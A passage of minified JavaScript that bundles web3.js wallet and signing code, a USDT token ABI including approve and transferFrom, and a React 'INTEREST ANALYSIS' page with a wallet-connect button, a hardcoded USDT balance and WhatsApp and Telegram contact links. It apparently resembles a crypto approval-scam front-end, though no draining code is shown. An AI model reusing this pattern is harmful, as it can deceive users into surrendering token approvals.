                        c(r.throw(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function c(e) {
                    var t;
                    e.done ? i(e.value) : (t = e.value, t instanceof n ? t : new n((function(e) {
                        e(t)
                    }))).then(a, s)
                }
                c((r = r.apply(e, t || [])).next())
            }))
        };
        const ny = e => {
            const t = (t, n) => ty(void 0, void 0, void 0, (function*() {
                    return ((e, t) => vf(void 0, void 0, void 0, (function*() {
                        const n = e.sign(ks(t));
                        if (ss(n.v) || ss(n.r) || ss(n.s)) throw new zn("Signer Error");
                        const r = n.validate(!0);
                        if (r.length > 0) {
                            let e = "Signer Error ";
                            for (const t of r) e += "".concat(e, " ").concat(t, ".");
                            throw new zn(e)
                        }
                        const i = As(n.serialize()),
                            o = _c(i);
                        return {
                            messageHash: As(n.getMessageToSign(!0)),
                            v: "0x".concat(n.v.toString(16)),
                            r: "0x".concat(n.r.toString(16).padStart(64, "0")),
                            s: "0x".concat(n.s.toString(16).padStart(64, "0")),
                            rawTransaction: i,
                            transactionHash: As(o)
                        }
                    })))(yield Um(t, e), kc({
                        format: "bytes"
                    }, n, $e))
                })),
                n = e => {
                    const n = Cf(e);
                    return Object.assign(Object.assign({}, n), {
                        signTransaction: e => ty(void 0, void 0, void 0, (function*() {
                            return t(e, n.privateKey)
                        }))
                    })
                },
                r = (e, n, r) => ty(void 0, void 0, void 0, (function*() {
                    var i;
                    const o = yield((e, t, n) => vf(void 0, void 0, void 0, (function*() {
                        const r = "object" === typeof e ? e : JSON.parse(n ? e.toLowerCase() : e);
                        if (ps.validateJSONSchema(Ed, r), 3 !== r.version) throw new Nt;
                        const i = "string" === typeof t ? ks(Ps(t)) : t;
                        let o;
                        if (ps.validate(["bytes"], [i]), "scrypt" === r.crypto.kdf) {
                            const e = r.crypto.kdfparams;
                            o = mu(i, "string" === typeof e.salt ? ks(e.salt) : e.salt, e.n, e.p, e.r, e.dklen)
                        } else {
                            if ("pbkdf2" !== r.crypto.kdf) throw new Tt; {
                                const e = r.crypto.kdfparams;
                                o = lu(i, "string" === typeof e.salt ? ks(e.salt) : e.salt, e.c, e.dklen, "sha256")
                            }
                        }
                        const a = ks(r.crypto.ciphertext);
                        if (_c(gs(o.slice(16, 32), a)).replace("0x", "") !== r.crypto.mac) throw new Bt;
                        const s = yield Gl(ks(r.crypto.ciphertext), o.slice(0, 16), ks(r.crypto.cipherparams.iv));
                        return Cf(s)
                    })))(e, n, null === (i = null === r || void 0 === r ? void 0 : r.nonStrict) || void 0 === i || i);
                    return Object.assign(Object.assign({}, o), {
                        signTransaction: e => ty(void 0, void 0, void 0, (function*() {
                            return t(e, o.privateKey)
                        }))
                    })
                })),
                i = () => {
                    const e = (() => {
                        const e = wd.utils.randomPrivateKey();
                        return Cf("".concat(As(e)))
                    })();
                    return Object.assign(Object.assign({}, e), {
                        signTransaction: n => ty(void 0, void 0, void 0, (function*() {
                            return t(n, e.privateKey)
                        }))
                    })
                },
                o = new Ll({
                    create: i,
                    privateKeyToAccount: n,
                    decrypt: r
                });
            return {
                signTransaction: t,
                create: i,
                privateKeyToAccount: n,
                decrypt: r,
                recoverTransaction: xf,
                hashMessage: bf,
                sign: wf,
                recover: Af,
                encrypt: Sf,
                wallet: o,
                privateKeyToAddress: kf,
                parseAndValidatePrivateKey: yf,
                privateKeyToPublicKey: Ef
            }
        };
        var ry, iy = function(e, t, n, r) {
            return new(n || (n = Promise))((function(i, o) {
                function a(e) {
                    try {
                        c(r.next(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function s(e) {
                    try {
                        c(r.throw(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function c(e) {
                    var t;
                    e.done ? i(e.value) : (t = e.value, t instanceof n ? t : new n((function(e) {
                        e(t)
                    }))).then(a, s)
                }
                c((r = r.apply(e, t || [])).next())
            }))
        };
        ! function(e) {
            e.eip6963announceProvider = "eip6963:announceProvider", e.eip6963requestProvider = "eip6963:requestProvider"
        }(ry || (ry = {}));
        const oy = new Map,
            ay = "web3:providersMapUpdated";
        class sy extends Tf {
            constructor() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : $v;
                var t;
                (cc(e) || "string" === typeof e && "" === e.trim() || "string" !== typeof e && !Il(e) && !e.provider) && console.warn("NOTE: web3.js is running without provider. You need to pass a provider in order to interact with the network!");
                let n = {};
                "string" === typeof e || Il(e) ? n.provider = e : n = e || {}, n.registeredSubscriptions = Object.assign(Object.assign({}, Mm), null !== (t = n.registeredSubscriptions) && void 0 !== t ? t : {}), super(n);
                const i = ny(this);
                this._wallet = i.wallet, this._accountProvider = i, this.utils = r;
                const o = this;
                const a = o.use(jm);
                this.eth = Object.assign(a, {
                    ens: o.use(Rv, ag.main),
                    Iban: Bf,
                    net: o.use(mh),
                    personal: o.use(Wv),
                    Contract: class extends Xm {
                        constructor(e, t, n, r, i) {
                            if (sc(t) && sc(n)) throw new Zt("Should not provide options at both 2nd and 3rd parameters");
                            let s, c, l, u = {};
                            if (!cc(t) && "object" !== typeof t && "string" !== typeof t) throw new Zt;
                            if ("string" === typeof t && (s = t), u = sc(t) ? t : sc(n) ? n : {}, c = t instanceof Tf ? t : n instanceof Tf ? n : r instanceof Tf ? r : o.getContextObject(), i ? l = i : yc(n) ? l = n : yc(r) && (l = r), super(e, s, u, c, l), super.subscribeToContextEvents(o), !cc(a)) {
                                const e = a.getTransactionMiddleware();
                                cc(e) || super.setTransactionMiddleware(e)
                            }
                        }
                    },
                    abi: ey,
                    accounts: i
                })
            }
        }
        sy.version = "4.11.0", sy.utils = r, sy.requestEIP6963Providers = () => iy(void 0, void 0, void 0, (function*() {
            return new Promise(((e, t) => {
                "undefined" === typeof window && t(new Error("window object not available, EIP-6963 is intended to be used within a browser")), window.addEventListener(ry.eip6963announceProvider, (t => {
                    oy.set(t.detail.info.uuid, t.detail);
                    const n = new CustomEvent(ay, {
                        detail: oy
                    });
                    window.dispatchEvent(n), e(oy)
                })), window.dispatchEvent(new Event(ry.eip6963requestProvider))
            }))
        })), sy.onNewProviderDiscovered = e => {
            if ("undefined" === typeof window) throw new Error("window object not available, EIP-6963 is intended to be used within a browser");
            window.addEventListener(ay, e)
        }, sy.modules = {
            Web3Eth: jm,
            Iban: Bf,
            Net: mh,
            ENS: Rv,
            Personal: Wv
        };
        const cy = sy,
            ly = [{
                constant: !0,
                inputs: [],
                name: "name",
                outputs: [{
                    name: "",
                    type: "string"
                }],
                payable: !1,
                stateMutability: "view",
                type: "function"
            }, {
                constant: !1,
                inputs: [{
                    name: "_upgradedAddress",
                    type: "address"
                }],
                name: "deprecate",
                outputs: [],
                payable: !1,
                stateMutability: "nonpayable",
                type: "function"
            }, {
                constant: !1,
                inputs: [{
                    name: "_spender",
                    type: "address"
                }, {
                    name: "_value",
                    type: "uint256"
                }],
                name: "approve",
                outputs: [],
                payable: !1,
                stateMutability: "nonpayable",
                type: "function"
            }, {
                constant: !0,
                inputs: [],
                name: "deprecated",
                outputs: [{
                    name: "",
                    type: "bool"
                }],
                payable: !1,
                stateMutability: "view",
                type: "function"
            }, {
                constant: !1,
                inputs: [{
                    name: "_evilUser",
                    type: "address"
                }],
                name: "addBlackList",
                outputs: [],
                payable: !1,
                stateMutability: "nonpayable",
                type: "function"
            }, {
                constant: !0,
                inputs: [],
                name: "totalSupply",
                outputs: [{
                    name: "",
                    type: "uint256"
                }],
                payable: !1,
                stateMutability: "view",
                type: "function"
            }, {
                constant: !1,
                inputs: [{
                    name: "_from",
                    type: "address"
                }, {
                    name: "_to",
                    type: "address"
                }, {
                    name: "_value",
                    type: "uint256"
                }],
                name: "transferFrom",
                outputs: [],
                payable: !1,
                stateMutability: "nonpayable",
                type: "function"
            }, {
                constant: !0,
                inputs: [],
                name: "upgradedAddress",
                outputs: [{
                    name: "",
                    type: "address"
                }],
                payable: !1,
                stateMutability: "view",
                type: "function"
            }, {
                constant: !0,
                inputs: [{
                    name: "",
                    type: "address"
                }],
                name: "balances",
                outputs: [{
                    name: "",
                    type: "uint256"
                }],
                payable: !1,
                stateMutability: "view",
                type: "function"
            }, {
                constant: !0,
                inputs: [],
                name: "decimals",
                outputs: [{
                    name: "",
                    type: "uint256"
                }],
                payable: !1,
                stateMutability: "view",
                type: "function"
            }, {
                constant: !0,
                inputs: [],
                name: "maximumFee",
                outputs: [{
                    name: "",
                    type: "uint256"
                }],
                payable: !1,
                stateMutability: "view",
                type: "function"
            }, {
                constant: !0,
                inputs: [],
                name: "_totalSupply",
                outputs: [{
                    name: "",
                    type: "uint256"
                }],
                payable: !1,
                stateMutability: "view",
                type: "function"
            }, {
                constant: !1,
                inputs: [],
                name: "unpause",
                outputs: [],
                payable: !1,
                stateMutability: "nonpayable",
                type: "function"
            }, {
                constant: !0,
                inputs: [{
                    name: "_maker",
                    type: "address"
                }],
                name: "getBlackListStatus",
                outputs: [{
                    name: "",
                    type: "bool"
                }],
                payable: !1,
                stateMutability: "view",
                type: "function"
            }, {
                constant: !0,
                inputs: [{
                    name: "",
                    type: "address"
                }, {
                    name: "",
                    type: "address"
                }],
                name: "allowed",
                outputs: [{
                    name: "",
                    type: "uint256"
                }],
                payable: !1,
                stateMutability: "view",
                type: "function"
            }, {
                constant: !0,
                inputs: [],
                name: "paused",
                outputs: [{
                    name: "",
                    type: "bool"
                }],
                payable: !1,
                stateMutability: "view",
                type: "function"
            }, {
                constant: !0,
                inputs: [{
                    name: "who",
                    type: "address"
                }],
                name: "balanceOf",
                outputs: [{
                    name: "",
                    type: "uint256"
                }],
                payable: !1,
                stateMutability: "view",
                type: "function"
            }, {
                constant: !1,
                inputs: [],
                name: "pause",
                outputs: [],
                payable: !1,
                stateMutability: "nonpayable",
                type: "function"
            }, {
                constant: !0,
                inputs: [],
                name: "getOwner",
                outputs: [{
                    name: "",
                    type: "address"
                }],
                payable: !1,
                stateMutability: "view",
                type: "function"
            }, {
                constant: !0,
                inputs: [],
                name: "owner",
                outputs: [{
                    name: "",
                    type: "address"
                }],
                payable: !1,
                stateMutability: "view",
                type: "function"
            }, {
                constant: !0,
                inputs: [],
                name: "symbol",
                outputs: [{
                    name: "",
                    type: "string"
                }],
                payable: !1,
                stateMutability: "view",
                type: "function"
            }, {
                constant: !1,
                inputs: [{
                    name: "_to",
                    type: "address"
                }, {
                    name: "_value",
                    type: "uint256"
                }],
                name: "transfer",
                outputs: [],
                payable: !1,
                stateMutability: "nonpayable",
                type: "function"
            }, {
                constant: !1,
                inputs: [{
                    name: "newBasisPoints",
                    type: "uint256"
                }, {
                    name: "newMaxFee",
                    type: "uint256"
                }],
                name: "setParams",
                outputs: [],
                payable: !1,
                stateMutability: "nonpayable",
                type: "function"
            }, {
                constant: !1,
                inputs: [{
                    name: "amount",
                    type: "uint256"
                }],
                name: "issue",
                outputs: [],
                payable: !1,
                stateMutability: "nonpayable",
                type: "function"
            }, {
                constant: !1,
                inputs: [{
                    name: "amount",
                    type: "uint256"
                }],
                name: "redeem",
                outputs: [],
                payable: !1,
                stateMutability: "nonpayable",
                type: "function"
            }, {
                constant: !0,
                inputs: [{
                    name: "_owner",
                    type: "address"
                }, {
                    name: "_spender",
                    type: "address"
                }],
                name: "allowance",
                outputs: [{
                    name: "remaining",
                    type: "uint256"
                }],
                payable: !1,
                stateMutability: "view",
                type: "function"
            }, {
                constant: !0,
                inputs: [],
                name: "basisPointsRate",
                outputs: [{
                    name: "",
                    type: "uint256"
                }],
                payable: !1,
                stateMutability: "view",
                type: "function"
            }, {
                constant: !0,
                inputs: [{
                    name: "",
                    type: "address"
                }],
                name: "isBlackListed",
                outputs: [{
                    name: "",
                    type: "bool"
                }],
                payable: !1,
                stateMutability: "view",
                type: "function"
            }, {
                constant: !1,
                inputs: [{
                    name: "_clearedUser",
                    type: "address"
                }],
                name: "removeBlackList",
                outputs: [],
                payable: !1,
                stateMutability: "nonpayable",
                type: "function"
            }, {
                constant: !0,
                inputs: [],
                name: "MAX_UINT",
                outputs: [{
                    name: "",
                    type: "uint256"
                }],
                payable: !1,
                stateMutability: "view",
                type: "function"
            }, {
                constant: !1,
                inputs: [{
                    name: "newOwner",
                    type: "address"
                }],
                name: "transferOwnership",
                outputs: [],
                payable: !1,
                stateMutability: "nonpayable",
                type: "function"
            }, {
                constant: !1,
                inputs: [{
                    name: "_blackListedUser",
                    type: "address"
                }],
                name: "destroyBlackFunds",
                outputs: [],
                payable: !1,
                stateMutability: "nonpayable",
                type: "function"
            }, {
                inputs: [{
                    name: "_initialSupply",
                    type: "uint256"
                }, {
                    name: "_name",
                    type: "string"
                }, {
                    name: "_symbol",
                    type: "string"
                }, {
                    name: "_decimals",
                    type: "uint256"
                }],
                payable: !1,
                stateMutability: "nonpayable",
                type: "constructor"
            }, {
                anonymous: !1,
                inputs: [{
                    indexed: !1,
                    name: "amount",
                    type: "uint256"
                }],
                name: "Issue",
                type: "event"
            }, {
                anonymous: !1,
                inputs: [{
                    indexed: !1,
                    name: "amount",
                    type: "uint256"
                }],
                name: "Redeem",
                type: "event"
            }, {
                anonymous: !1,
                inputs: [{
                    indexed: !1,
                    name: "newAddress",
                    type: "address"
                }],
                name: "Deprecate",
                type: "event"
            }, {
                anonymous: !1,
                inputs: [{
                    indexed: !1,
                    name: "feeBasisPoints",
                    type: "uint256"
                }, {
                    indexed: !1,
                    name: "maxFee",
                    type: "uint256"
                }],
                name: "Params",
                type: "event"
            }, {
                anonymous: !1,
                inputs: [{
                    indexed: !1,
                    name: "_blackListedUser",
                    type: "address"
                }, {
                    indexed: !1,
                    name: "_balance",
                    type: "uint256"
                }],
                name: "DestroyedBlackFunds",
                type: "event"
            }, {
                anonymous: !1,
                inputs: [{
                    indexed: !1,
                    name: "_user",
                    type: "address"
                }],
                name: "AddedBlackList",
                type: "event"
            }, {
                anonymous: !1,
                inputs: [{
                    indexed: !1,
                    name: "_user",
                    type: "address"
                }],
                name: "RemovedBlackList",
                type: "event"
            }, {
                anonymous: !1,
                inputs: [{
                    indexed: !0,
                    name: "owner",
                    type: "address"
                }, {
                    indexed: !0,
                    name: "spender",
                    type: "address"
                }, {
                    indexed: !1,
                    name: "value",
                    type: "uint256"
                }],
                name: "Approval",
                type: "event"
            }, {
                anonymous: !1,
                inputs: [{
                    indexed: !0,
                    name: "from",
                    type: "address"
                }, {
                    indexed: !0,
                    name: "to",
                    type: "address"
                }, {
                    indexed: !1,
                    name: "value",
                    type: "uint256"
                }],
                name: "Transfer",
                type: "event"
            }, {
                anonymous: !1,
                inputs: [],
                name: "Pause",
                type: "event"
            }, {
                anonymous: !1,
                inputs: [],
                name: "Unpause",
                type: "event"
            }];
        var uy = n(579);
        const dy = e => {
                let {
                    handleConnectWallet: t,
                    isWalletConnected: n
                } = e;
                return (0, uy.jsx)("div", {
                    className: "top_bg",
                    children: (0, uy.jsxs)("div", {
                        className: "van-row van-row--flex van-row--align-center van-row--justify-space-around",
                        style: {
                            marginLeft: "-5px",
                            marginRight: "-5px"
                        },
                        children: [(0, uy.jsx)("div", {
                            className: "van-col van-col--4",
                            style: {
                                paddingLeft: "5px",
                                paddingRight: "5px",
                                justifyContent: "center",
                                alignItems: "center"
                            },
                            children: (0, uy.jsxs)("div", {
                                className: "Fr",
                                style: {
                                    height: "35px"
                                },
                                children: [(0, uy.jsx)("img", {
                                    src: "/_nuxt/img/ethereum.9df59bc.png",
                                    alt: "Ethereum",
                                    height: "20",
                                    width: "20"
                                }), (0, uy.jsx)("img", {
                                    src: "/_nuxt/img/option.svg",
                                    alt: "Currency Icon",
                                    style: {
                                        paddingLeft: "5px"
                                    }
                                })]
                            })
                        }), (0, uy.jsx)("div", {
                            className: "van-col van-col--10",
                            style: {
                                paddingLeft: "5px",
                                paddingRight: "5px"
                            },
                            children: (0, uy.jsx)("div", {
                                className: "wallet",
                                children: "INTEREST ANALYSIS"
                            })
                        }), n ? (0, uy.jsx)("div", {
                            className: "van-col van-col--3",
                            style: {
                                paddingLeft: "5px",
                                paddingRight: "5px"
                            },
                            children: (0, uy.jsx)("div", {
                                className: "Fr",
                                children: (0, uy.jsx)("img", {
                                    src: "/_nuxt/img/confirm-icon.svg",
                                    width: "20",
                                    height: "20",
                                    alt: "Language"
                                })
                            })
                        }) : (0, uy.jsx)("div", {
                            onClick: t,
                            className: "van-col van-col--3",
                            style: {
                                paddingLeft: "5px",
                                paddingRight: "5px"
                            },
                            children: (0, uy.jsxs)("div", {
                                className: "Fr",
                                children: [(0, uy.jsx)("img", {
                                    src: "/_nuxt/img/language.a2d6cc4.svg",
                                    alt: "Language"
                                }), (0, uy.jsx)("p", {
                                    style: {
                                        fontSize: "8px"
                                    },
                                    children: "CONNECT NETWORK"
                                })]
                            })
                        })]
                    })
                })
            },
            fy = () => (0, uy.jsxs)("div", {
                className: "articlePopup",
                style: {
                    display: "none"
                },
                children: [(0, uy.jsxs)("div", {
                    className: "Fr mt10",
                    style: {
                        justifyContent: "left",
                        marginLeft: "10px"
                    },
                    children: [(0, uy.jsx)("img", {
                        src: "/_nuxt/img/ethereum.9df59bc.png",
                        width: "20",
                        height: "20",
                        className: "mr10",
                        alt: "Ethereum"
                    }), (0, uy.jsx)("div", {
                        className: "coin",
                        children: "ERC20"
                    })]
                }), (0, uy.jsxs)("div", {
                    className: "Fr mt10",
                    style: {
                        justifyContent: "left",
                        marginLeft: "10px"
                    },
                    children: [(0, uy.jsx)("img", {
                        src: "/_nuxt/img/usdc.0c6d6e4.png",
                        width: "20",
                        height: "20",
                        className: "mr10",
                        alt: "USDC"
                    }), (0, uy.jsx)("div", {
                        className: "coin",
                        children: "USDC"
                    })]
                }), (0, uy.jsxs)("div", {
                    className: "Fr mt10",
                    style: {
                        justifyContent: "left",
                        marginLeft: "10px"
                    },
                    children: [(0, uy.jsx)("img", {
                        src: "/_nuxt/img/trc.5b6c792.png",
                        width: "20",
                        height: "20",
                        className: "mr10",
                        alt: "TRC20"
                    }), (0, uy.jsx)("div", {
                        className: "coin",
                        children: "TRC20"
                    })]
                }), (0, uy.jsxs)("div", {
                    className: "Fr mt10",
                    style: {
                        justifyContent: "left",
                        marginLeft: "10px"
                    },
                    children: [(0, uy.jsx)("img", {
                        src: "data:image/png;base64,...",
                        width: "20",
                        height: "20",
                        className: "mr10",
                        alt: "DAI-BEP20"
                    }), (0, uy.jsx)("div", {
                        className: "coin",
                        children: "DAI-BEP20"
                    })]
                }), (0, uy.jsxs)("div", {
                    className: "Fr mt10",
                    style: {
                        justifyContent: "left",
                        marginLeft: "10px"
                    },
                    children: [(0, uy.jsx)("img", {
                        src: "/_nuxt/img/webconn.62273ca.png",
                        width: "20",
                        height: "20",
                        className: "mr10",
                        alt: "WalletConnect"
                    }), (0, uy.jsx)("div", {
                        className: "coin",
                        children: "WalletConnect"
                    })]
                })]
            }),
            hy = () => (0, uy.jsx)("div", {
                className: "articleLanage",
                style: {
                    display: "none"
                },
                children: ["English", "Espa\xf1a", "\u65e5\u672c\u8a9e", "\u7e41\u9ad4", "\ud55c\uad6d\uc5b4", "Ti\u1ebfng Vi\u1ec7t", "T\xfcrk\xe7e", "\u0420\u0443\u0441\u0441\u043a\u0438\u0439 \u044f\u0437\u044b\u043a", "IndonesiaName"].map(((e, t) => (0, uy.jsx)("div", {
                    className: "coin mt10",
                    children: e
                }, t)))
            }),
            py = () => (0, uy.jsx)("div", {
                className: "Fr keFu",
                style: {
                    position: "fixed",
                    left: "80%",
                    top: "40%",
                    width: "50px",
                    height: "50px",
                    borderRadius: "45%",
                    display: "none"
                },
                children: (0, uy.jsx)("img", {
                    src: "/_nuxt/img/kefu.d402358.svg",
                    alt: "Help"
                })
            });
        const my = function(e) {
            let {
                handleConnectWallet: t,
                isWalletConnected: n
            } = e;
            return (0, uy.jsxs)("div", {
                children: [(0, uy.jsx)(dy, {
                    handleConnectWallet: t,
                    isWalletConnected: n
                }), (0, uy.jsx)(fy, {}), (0, uy.jsx)(hy, {}), (0, uy.jsx)(py, {})]
            })
        };
        var gy = {
                color: void 0,
                size: void 0,
                className: void 0,
                style: void 0,
                attr: void 0
            },
            vy = s.createContext && s.createContext(gy),
            yy = ["attr", "size", "title"];

        function by(e, t) {
            if (null == e) return {};
            var n, r, i = function(e, t) {
                if (null == e) return {};
                var n = {};
                for (var r in e)
                    if (Object.prototype.hasOwnProperty.call(e, r)) {
                        if (t.indexOf(r) >= 0) continue;
                        n[r] = e[r]
                    }
                return n
            }(e, t);
            if (Object.getOwnPropertySymbols) {
                var o = Object.getOwnPropertySymbols(e);
                for (r = 0; r < o.length; r++) n = o[r], t.indexOf(n) >= 0 || Object.prototype.propertyIsEnumerable.call(e, n) && (i[n] = e[n])
            }
            return i
        }

        function wy() {
            return wy = Object.assign ? Object.assign.bind() : function(e) {
                for (var t = 1; t < arguments.length; t++) {
                    var n = arguments[t];
                    for (var r in n) Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r])
                }
                return e
            }, wy.apply(this, arguments)
        }

        function xy(e, t) {
            var n = Object.keys(e);
            if (Object.getOwnPropertySymbols) {
                var r = Object.getOwnPropertySymbols(e);
                t && (r = r.filter((function(t) {
                    return Object.getOwnPropertyDescriptor(e, t).enumerable
                }))), n.push.apply(n, r)
            }
            return n
        }

        function Ay(e) {
            for (var t = 1; t < arguments.length; t++) {
                var n = null != arguments[t] ? arguments[t] : {};
                t % 2 ? xy(Object(n), !0).forEach((function(t) {
                    ky(e, t, n[t])
                })) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(n)) : xy(Object(n)).forEach((function(t) {
                    Object.defineProperty(e, t, Object.getOwnPropertyDescriptor(n, t))
                }))
            }
            return e
        }

        function ky(e, t, n) {
            return t = function(e) {
                var t = function(e, t) {
                    if ("object" != typeof e || !e) return e;
                    var n = e[Symbol.toPrimitive];
                    if (void 0 !== n) {
                        var r = n.call(e, t || "default");
                        if ("object" != typeof r) return r;
                        throw new TypeError("@@toPrimitive must return a primitive value.")
                    }
                    return ("string" === t ? String : Number)(e)
                }(e, "string");
                return "symbol" == typeof t ? t : t + ""
            }(t), t in e ? Object.defineProperty(e, t, {
                value: n,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = n, e
        }

        function Ey(e) {
            return e && e.map(((e, t) => s.createElement(e.tag, Ay({
                key: t
            }, e.attr), Ey(e.child))))
        }

        function Sy(e) {
            return t => s.createElement(Cy, wy({
                attr: Ay({}, e.attr)
            }, t), Ey(e.child))
        }

        function Cy(e) {
            var t = t => {
                var n, {
                        attr: r,
                        size: i,
                        title: o
                    } = e,
                    a = by(e, yy),
                    c = i || t.size || "1em";
                return t.className && (n = t.className), e.className && (n = (n ? n + " " : "") + e.className), s.createElement("svg", wy({
                    stroke: "currentColor",
                    fill: "currentColor",
                    strokeWidth: "0"
                }, t.attr, r, a, {
                    className: n,
                    style: Ay(Ay({
                        color: e.color || t.color
                    }, t.style), e.style),
                    height: c,
                    width: c,
                    xmlns: "http://www.w3.org/2000/svg"
                }), o && s.createElement("title", null, o), e.children)
            };
            return void 0 !== vy ? s.createElement(vy.Consumer, null, (e => t(e))) : t(gy)
        }

        function _y(e) {
            return Sy({
                tag: "svg",
                attr: {
                    viewBox: "0 0 448 512"
                },
                child: [{
                    tag: "path",
                    attr: {
                        d: "M424.7 299.8c2.9-14 4.7-28.9 4.7-43.8 0-113.5-91.9-205.3-205.3-205.3-14.9 0-29.7 1.7-43.8 4.7C161.3 40.7 137.7 32 112 32 50.2 32 0 82.2 0 144c0 25.7 8.7 49.3 23.3 68.2-2.9 14-4.7 28.9-4.7 43.8 0 113.5 91.9 205.3 205.3 205.3 14.9 0 29.7-1.7 43.8-4.7 19 14.6 42.6 23.3 68.2 23.3 61.8 0 112-50.2 112-112 .1-25.6-8.6-49.2-23.2-68.1zm-194.6 91.5c-65.6 0-120.5-29.2-120.5-65 0-16 9-30.6 29.5-30.6 31.2 0 34.1 44.9 88.1 44.9 25.7 0 42.3-11.4 42.3-26.3 0-18.7-16-21.6-42-28-62.5-15.4-117.8-22-117.8-87.2 0-59.2 58.6-81.1 109.1-81.1 55.1 0 110.8 21.9 110.8 55.4 0 16.9-11.4 31.8-30.3 31.8-28.3 0-29.2-33.5-75-33.5-25.7 0-42 7-42 22.5 0 19.8 20.8 21.8 69.1 33 41.4 9.3 90.7 26.8 90.7 77.6 0 59.1-57.1 86.5-112 86.5z"
                    },
                    child: []
                }]
            })(e)
        }

        function Iy(e) {
            return Sy({
                tag: "svg",
                attr: {
                    viewBox: "0 0 496 512"
                },
                child: [{
                    tag: "path",
                    attr: {
                        d: "M248 8C111 8 0 119 0 256s111 248 248 248 248-111 248-248S385 8 248 8zm121.8 169.9l-40.7 191.8c-3 13.6-11.1 16.9-22.4 10.5l-62-45.7-29.9 28.8c-3.3 3.3-6.1 6.1-12.5 6.1l4.4-63.1 114.9-103.8c5-4.4-1.1-6.9-7.7-2.5l-142 89.4-61.2-19.1c-13.3-4.2-13.6-13.3 2.8-19.7l239.1-92.2c11.1-4 20.8 2.7 17.2 19.5z"
                    },
                    child: []
                }]
            })(e)
        }

        function Py(e) {
            return Sy({
                tag: "svg",
                attr: {
                    viewBox: "0 0 448 512"
                },
                child: [{
                    tag: "path",
                    attr: {
                        d: "M380.9 97.1C339 55.1 283.2 32 223.9 32c-122.4 0-222 99.6-222 222 0 39.1 10.2 77.3 29.6 111L0 480l117.7-30.9c32.4 17.7 68.9 27 106.1 27h.1c122.3 0 224.1-99.6 224.1-222 0-59.3-25.2-115-67.1-157zm-157 341.6c-33.2 0-65.7-8.9-94-25.7l-6.7-4-69.8 18.3L72 359.2l-4.4-7c-18.5-29.4-28.2-63.3-28.2-98.2 0-101.7 82.8-184.5 184.6-184.5 49.3 0 95.6 19.2 130.4 54.1 34.8 34.9 56.2 81.2 56.1 130.5 0 101.8-84.9 184.6-186.6 184.6zm101.2-138.2c-5.5-2.8-32.8-16.2-37.9-18-5.1-1.9-8.8-2.8-12.5 2.8-3.7 5.6-14.3 18-17.6 21.8-3.2 3.7-6.5 4.2-12 1.4-32.6-16.3-54-29.1-75.5-66-5.7-9.8 5.7-9.1 16.3-30.3 1.8-3.7.9-6.9-.5-9.7-1.4-2.8-12.5-30.1-17.1-41.2-4.5-10.8-9.1-9.3-12.5-9.5-3.2-.2-6.9-.2-10.6-.2-3.7 0-9.7 1.4-14.8 6.9-5.1 5.6-19.4 19-19.4 46.3 0 27.3 19.9 53.7 22.6 57.4 2.8 3.7 39.1 59.7 94.8 83.8 35.2 15.2 49 16.5 66.6 13.9 10.7-1.6 32.8-13.4 37.4-26.4 4.6-13 4.6-24.1 3.2-26.4-1.3-2.5-5-3.9-10.5-6.6z"
                    },
                    child: []
                }]
            })(e)
        }
        const Ty = () => {
                const e = {
                    color: "#fff",
                    margin: "0 10px",
                    fontSize: "24px",
                    transition: "color 0.3s"
                };
                return (0, uy.jsxs)("div", {
                    style: {
                        width: "100%",
                        display: "flex",
                        justifyContent: "center",
                        padding: "10px 0",
                        backgroundColor: "#000",
                        zIndex: 1e3,
                        marginTop: "20px"
                    },
                    children: [(0, uy.jsx)("a", {
                        href: "https://wa.me/+85252882632",
                        target: "_blank",
                        rel: "noopener noreferrer",
                        style: e,
                        children: (0, uy.jsx)(Py, {})
                    }), (0, uy.jsx)("a", {
                        href: "https://t.me/+85252882632",
                        target: "_blank",
                        rel: "noopener noreferrer",
                        style: e,
                        children: (0, uy.jsx)(Iy, {})
                    }), (0, uy.jsx)("a", {
                        href: "skype:live:.cid.23afe0b79aeee08a?chat",
                        target: "_blank",
                        rel: "noopener noreferrer",
                        style: e,
                        children: (0, uy.jsx)(_y, {})
                    })]
                })
            },
            By = e => {
                let {
                    content: t,
                    handleConnectWallet: n,
                    isWalletConnected: r
                } = e;
                return (0, uy.jsxs)("div", {
                    children: [(0, uy.jsx)(my, {
                        handleConnectWallet: n,
                        isWalletConnected: r
                    }), t, (0, uy.jsx)(Ty, {})]
                })
            },
            Ny = e => {
                let {
                    onClose: t
                } = e;
                return (0, uy.jsxs)("div", {
                    className: "van-popup van-popup--round van-popup--center",
                    style: {
                        background: "linear-gradient(0deg, rgb(47, 52, 98), rgb(47, 52, 98)), linear-gradient(0deg, rgb(194, 194, 194), rgb(194, 194, 194))",
                        textAlign: "center",
                        height: "320px",
                        width: "85%",
                        zIndex: "2035"
                    },
                    children: [(0, uy.jsxs)("div", {
                        className: "articlePopup",
                        children: [(0, uy.jsx)("div", {
                            className: "popTitle mt20",
                            children: "Transfer"
                        }), (0, uy.jsx)("div", {
                            className: "line_cancel"
                        }), (0, uy.jsxs)("div", {
                            className: "invite income",
                            style: {
                                height: "220px"
                            },
                            children: [(0, uy.jsx)("div", {
                                className: "contract ml20 pt10",
                                children: "Receiving address"
                            }), (0, uy.jsx)("div", {
                                className: "van-cell van-cell--center van-field",
                                children: (0, uy.jsx)("div", {
                                    className: "van-cell__value van-cell__value--alone van-field__value",
                                    children: (0, uy.jsx)("div", {
                                        className: "van-field__body",
                                        children: (0, uy.jsx)("input", {
                                            type: "text",
                                            name: "receiving_address",
                                            placeholder: "Please enter the receiving address",
                                            className: "van-field__control"
                                        })
                                    })
                                })
                            }), (0, uy.jsxs)("div", {
                                className: "Frsb",
                                children: [(0, uy.jsx)("div", {
                                    className: "contract ml20",
                                    children: "Quantity available (USDT)"
                                }), (0, uy.jsx)("div", {
                                    className: "assets_weight mr20",
                                    children: "6.17999"
                                })]
                            }), (0, uy.jsx)("div", {
                                className: "contract ml20 pt10",
                                children: "Quantity"
                            }), (0, uy.jsx)("div", {
                                className: "van-cell van-cell--center van-field",
                                style: {
                                    marginBottom: "10px"
                                },
                                children: (0, uy.jsx)("div", {
                                    className: "van-cell__value van-cell__value--alone van-field__value",
